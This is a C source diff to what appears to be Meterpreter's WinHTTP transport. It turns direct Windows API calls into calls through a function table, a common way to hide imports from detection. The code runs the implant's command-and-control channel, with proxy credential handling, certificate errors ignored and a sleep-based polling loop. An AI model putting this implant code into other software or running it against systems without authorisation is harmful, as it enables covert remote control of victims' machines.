@@ -41,7 +41,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 	PWSTR uri = generate_uri(ctx, conn);
 
 	vdprintf("[%s] opening request on connection %x to %S", direction, conn->connection, uri);
-	hReq = WinHttpOpenRequest(conn->connection, isGet ? L"GET" : L"POST", uri, NULL, NULL, NULL, flags);
+	hReq = met_api->win_api.winhttp.WinHttpOpenRequest(conn->connection, isGet ? L"GET" : L"POST", uri, NULL, NULL, NULL, flags);
 
 	free(uri);
 
@@ -59,7 +59,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 		if (!ctx->proxy_configured)
 		{
 			WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ieConfig = { 0 };
-			if (WinHttpGetIEProxyConfigForCurrentUser(&ieConfig))
+			if (met_api->win_api.winhttp.WinHttpGetIEProxyConfigForCurrentUser(&ieConfig))
 			{
 				dprintf("[PROXY] Got IE configuration");
 				dprintf("[PROXY] AutoDetect: %s", ieConfig.fAutoDetect ? "yes" : "no");
@@ -90,7 +90,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 					}
 					autoProxyOpts.fAutoLogonIfChallenged = TRUE;
 
-					if (WinHttpGetProxyForUrl(conn->internet, ctx->url, &autoProxyOpts, &proxyInfo))
+					if (met_api->win_api.winhttp.WinHttpGetProxyForUrl(conn->internet, ctx->url, &autoProxyOpts, &proxyInfo))
 					{
 						ctx->proxy_for_url = calloc(1, sizeof(WINHTTP_PROXY_INFO));
 						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
@@ -132,7 +132,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 		}
 
 		if (ctx->proxy_for_url &&
-			!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, ctx->proxy_for_url, sizeof(WINHTTP_PROXY_INFO)))
+			!met_api->win_api.winhttp.WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, ctx->proxy_for_url, sizeof(WINHTTP_PROXY_INFO)))
 		{
 			dprintf("[%s] Unable to set proxy options: %u", GetLastError());
 		}
@@ -142,7 +142,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 		if (ctx->proxy_user)
 		{
 			dprintf("[%s] Setting proxy username to %S", direction, ctx->proxy_user);
-			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_USERNAME, ctx->proxy_user, (DWORD)(wcslen(ctx->proxy_user))))
+			if (!met_api->win_api.winhttp.WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_USERNAME, ctx->proxy_user, (DWORD)(wcslen(ctx->proxy_user))))
 			{
 				dprintf("[%s] Failed to set username %u", direction, GetLastError());
 			}
@@ -150,7 +150,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 		if (ctx->proxy_pass)
 		{
 			dprintf("[%s] Setting proxy password to %S", direction, ctx->proxy_pass);
-			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, (DWORD)(wcslen(ctx->proxy_pass))))
+			if (!met_api->win_api.winhttp.WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, (DWORD)(wcslen(ctx->proxy_pass))))
 			{
 				dprintf("[%s] Failed to set password %u", direction, GetLastError());
 			}
@@ -163,7 +163,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
 			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
 			| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-		if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
+		if (!met_api->win_api.winhttp.WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
 		{
 			dprintf("[%s] failed to set the security flags on the request", direction);
 		}
@@ -179,7 +179,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
  */
 static BOOL close_request_winhttp(HANDLE hReq)
 {
-	return WinHttpCloseHandle(hReq);
+	return met_api->win_api.winhttp.WinHttpCloseHandle(hReq);
 }
 
 /*!
@@ -192,7 +192,7 @@ static BOOL close_request_winhttp(HANDLE hReq)
  */
 static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead, LPDWORD bytesRead)
 {
-	return WinHttpReadData(hReq, buffer, bytesToRead, bytesRead);
+	return met_api->win_api.winhttp.WinHttpReadData(hReq, buffer, bytesToRead, bytesRead);
 }
 
 /*
@@ -213,7 +213,7 @@ static BOOL write_to_request(HANDLE hReq, LPVOID buffer, DWORD size)
 		LPBYTE data = (LPBYTE)buffer;
 		DWORD written = 0;
 		dprintf("[WINHTTP] writing data to request. %u (0x%x) from %p", size, size, data + written);
-		if (!WinHttpWriteData(hReq, data + written, size, &written))
+		if (!met_api->win_api.winhttp.WinHttpWriteData(hReq, data + written, size, &written))
 		{
 			return FALSE;
 		}
@@ -241,7 +241,7 @@ static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, HttpCon
 	DWORD totalSize = size + conn->options.payload_prefix_size + conn->options.payload_suffix_size;
 
 	// Start a request without including any data
-	if (WinHttpSendRequest(hReq, headers, headerLength, NULL, 0, totalSize, 0))
+	if (met_api->win_api.winhttp.WinHttpSendRequest(hReq, headers, headerLength, NULL, 0, totalSize, 0))
 	{
 		dprintf("[WINHTTP] Sending prefix");
 		// Then write the prefix first
@@ -274,7 +274,7 @@ static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, HttpCon
  */
 static BOOL receive_response_winhttp(HANDLE hReq)
 {
-	return WinHttpReceiveResponse(hReq, NULL);
+	return met_api->win_api.winhttp.WinHttpReceiveResponse(hReq, NULL);
 }
 
 /*!
@@ -289,7 +289,7 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, L
 	DWORD statusCode;
 	DWORD statusCodeSize = sizeof(statusCode);
 	vdprintf("[PACKET RECEIVE WINHTTP] Getting the result code...");
-	if (WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
+	if (met_api->win_api.winhttp.WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
 	{
 		vdprintf("[PACKET RECEIVE WINHTTP] Returned status code is %d", statusCode);
 
@@ -325,7 +325,7 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, L
 		PCERT_CONTEXT pCertContext = NULL;
 		DWORD dwCertContextSize = sizeof(pCertContext);
 
-		if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
+		if (!met_api->win_api.winhttp.WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
 		{
 			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate context: %u", GetLastError());
 			return ERROR_WINHTTP_SECURE_INVALID_CERT;
@@ -333,7 +333,7 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, L
 
 		DWORD dwHashSize = 20;
 		BYTE hash[20];
-		if (!CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
+		if (!met_api->win_api.crypt32.CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
 		{
 			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate hash: %u", GetLastError());
 			return ERROR_WINHTTP_SECURE_INVALID_CERT;
@@ -353,7 +353,7 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, L
 	// if we get here, then we should be good to look at the content length
 	DWORD size = sizeof(DWORD);
 
-	if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
+	if (!met_api->win_api.winhttp.WinHttpQueryHeaders(hReq, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
 		WINHTTP_HEADER_NAME_BY_INDEX, contentLength, &size, WINHTTP_NO_HEADER_INDEX))
 	{
 		return GetLastError();
@@ -448,7 +448,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 
 	if (!ctx->send_req(ctx, hReq, &ctx->get_connection, NULL, 0))
 	{
-		dprintf("[PACKET RECEIVE HTTP] Failed send_req: %d %d", GetLastError(), WSAGetLastError());
+		dprintf("[PACKET RECEIVE HTTP] Failed send_req: %d %d", GetLastError(), met_api->win_api.ws2_32.WSAGetLastError());
 		result = ERROR_NOT_FOUND;
 		goto out;
 	}
@@ -642,11 +642,11 @@ static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* c
 	if (ctx->proxy)
 	{
 		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
-		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
+		conn->internet = met_api->win_api.winhttp.WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 	else
 	{
-		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+		conn->internet = met_api->win_api.winhttp.WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 
 	if (!conn->internet)
@@ -659,7 +659,7 @@ static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* c
 
 
 	// Allocate the connection handle
-	conn->connection = WinHttpConnect(conn->internet, host, port, 0);
+	conn->connection = met_api->win_api.winhttp.WinHttpConnect(conn->internet, host, port, 0);
 	if (!conn->connection)
 	{
 		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
@@ -699,7 +699,7 @@ static DWORD server_init_winhttp(Transport* transport)
 	bits.lpszUrlPath = tmpUrlPath;
 
 	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
-	WinHttpCrackUrl(transport->url, 0, 0, &bits);
+	met_api->win_api.winhttp.WinHttpCrackUrl(transport->url, 0, 0, &bits);
 
 	http_options_set_single_uri(&ctx->default_options, tmpUrlPath);
 
@@ -852,7 +852,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			ecount++;
 
 			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
-			Sleep(min(10000, delay));
+			met_api->win_api.kernel32.Sleep(min(10000, delay));
 		}
 		else
 		{
